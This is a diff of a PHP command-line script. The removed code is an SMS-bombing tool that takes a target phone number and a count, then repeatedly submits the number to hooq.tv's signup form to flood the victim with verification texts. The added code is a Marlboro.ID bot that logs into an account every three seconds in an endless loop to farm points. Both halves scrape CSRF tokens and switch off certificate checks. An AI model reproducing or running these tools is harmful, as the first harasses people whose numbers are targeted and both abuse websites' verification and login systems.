@@ -1,88 +1,102 @@
+
 <?php
 error_reporting(0);
-Class Bom {
-public $no;
-public function sendC($url, $page, $params) {
-$ch=curl_init();
-curl_setopt ($ch, CURLOPT_URL, $url.$page); 
-curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
-curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
-if(!empty($params)) {
-curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
-curl_setopt ($ch, CURLOPT_POST, 1); 
+echo "Marlboro.ID - Auto Login - YarzCode\n";
+echo "Enter E-Mail: ";
+$email = trim(fgets(STDIN));
+echo "Enter Password: \e[0;30m";
+$password = trim(fgets(STDIN));
+echo "\e[0m\n";
+echo "Start proccess...\n\n";
+
+while(true)
+{
+	$login = login($email, $password);
+	if(is_array($login))
+	{
+		echo "Login Success | Point saat ini: ".$login[1]."\n";
+	} else {
+		echo "Login Failed | Reason: ".$login."\n";
+	}
+	sleep(3);
 }
-curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
-curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
-curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
-$headers=array();
-$headers[]='Content-Type: application/x-www-form-urlencoded; charset=utf-8';
-$headers[]='X-Requested-With: XMLHttpRequest';
-curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
-curl_setopt ($ch, CURLOPT_HEADER, 1);
-$result=curl_exec ($ch);
-curl_close($ch);
-return $result;
+
+
+function login($email, $pass)
+{
+	$cookie = "ngentod.txt";
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, 'https://www.marlboro.id/auth/login?ref_uri=/profile');
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_POST, false);
+	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+	if(curl_error($ch))
+	{
+		die("Something error: ".curl_error($ch));
+	}
+	$ret = curl_exec($ch);
+	curl_close($ch);
+
+	if(strpos($ret, 'decide_csrf'))
+	{
+	    $header = array();
+	    $header[] = 'Accept-Encoding: gzip, deflate, br';
+	    $header[] = 'Accept-Language: en-US,en;q=0.9';
+	    $header[] = 'Connection: keep-alive';
+	    $header[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+	    $header[] = 'Host: www.marlboro.id';
+	    $header[] = 'Origin: https://www.marlboro.id';
+	    $header[] = 'Referer: https://www.marlboro.id/';
+	    $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36';
+	    $header[] = 'X-Requested-With: XMLHttpRequest';
+		preg_match('/<input type="hidden" name="decide_csrf" value="(.*?)"/', $ret, $decide);
+		$somebody = array('email' => str_replace('@','%40',$email), 'password' => $pass, 'decide_csrf' => $decide[1], 'ref_uri' => urlencode('/profile'));
+		$ch = curl_init();
+	    curl_setopt($ch, CURLOPT_URL, 'https://www.marlboro.id/auth/login');
+	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	    curl_setopt($ch, CURLOPT_POST, 1);
+	    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($somebody));
+	    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+	    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+	    if(curl_error($ch))
+	    {
+	    	die("Something error: ".curl_error($ch));
+	    }
+	    $ret = curl_exec($ch);
+	    curl_close($ch);	
+	    if(json_decode($ret,1)['error'] == true)
+	    {
+	    	return json_decode($ret,1)['error']['message'];
+	    } else {
+	    	 $ch = curl_init();
+	         curl_setopt($ch, CURLOPT_URL, 'https://www.marlboro.id/profile');
+	         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	         curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
+	         curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+	         if(curl_error($ch))
+	         {
+	         	die("Something error: ".curl_error($ch));
+	         }
+	         $ret = curl_exec($ch);
+	         curl_close($ch);	
+	         preg_match('/<span class="point-place" data-current="(.*?)">/', $ret, $point);
+	         if(isset($point[1]))
+	         { 
+	         	return array('success',$point[1]);
+	         } else {
+	         	return 'An Error Occured';
+	         }
+	    }
+	} else {
+		return 'Error to get csrf_token';
+	}
+	unlink($cookie);
 }
-private function getStr($start, $end, $string) {
-if(!empty($string)) {
-$setring = explode($start,$string);
-$setring = explode($end,$setring[1]);
-return $setring[0];
-}
-}
-public function angka($length = 4) {
-$characters='0123456789';
-$charactersLength=strlen($characters);
-$randomString='';
-for($i = 0; $i < $length; $i++) {
-$randomString .= $characters[rand(0, $charactersLength - 1)];
-}
-return $randomString;   
-}
-public function Verif() {
-$url="https://www.hooq.tv/signup";
-$no=$this->no;
-$getkey=$this->sendC("https://www.hooq.tv/id/signup", null, null);
-$key=$this->getStr('name="_csrf" value="','" />',$getkey);
-$data="_csrf={$key}&device_id=56ad6be9-cd02-{$this->angka()}-{$this->angka()}-d4f2435ef6e8&country_code=%2B62&mobile={$no}";
-$send=$this->sendC($url, null, $data);
-if(preg_match('/SMS Kode Verifikasi Kamu sudah terkirim ke/', $send)) {
-echo "\n\e[92mHAC Send Succes Bro!";
-flush();
-ob_flush();
-sleep(1);
-}else {
-echo "\n\e[91mHAC Send Failed!";
-flush();
-ob_flush();
-sleep(1);
-}
-}    
-}
-system("clear");
-echo "\n\e[93m _   _
-|    | | | | __ _  ___     |  <<<      >>>
-|    | |_| |/ _` |/ __|    | <<<<      >>>>
-|    |  _  | (_| | (__     |<<<<<======>>>>>
-|    |_| |_|\__,_|\___|    | <<<<      >>>>
-|__________________________|  <<<      >>>
-\e[36m===========\e[91m>>>>>>>>>>\n\e[36mAuthor  : Handika Pratama
-Recode  : Mr Crabs
-Code    : PHP
-Github  : https://github.com/adityamah
-Team    : 1NTR0VER7
-Version : 3.0 ( Alpha )
-Date    : 9-01-2018
-\e[36m===========\e[91m>>>>>>>>>>";
-echo "\n\e[36mTarget  : ";
-$target=trim(fgets(STDIN, 1024));
-echo "Count   : ";
-$jumlah=trim(fgets(STDIN, 1024));
-$init=new Bom();
-$init->no="$target";
-$loop="$jumlah";
-for($i=0; $i < $loop; $i++) { 
-$init->Verif($init->no);
-}
-?>
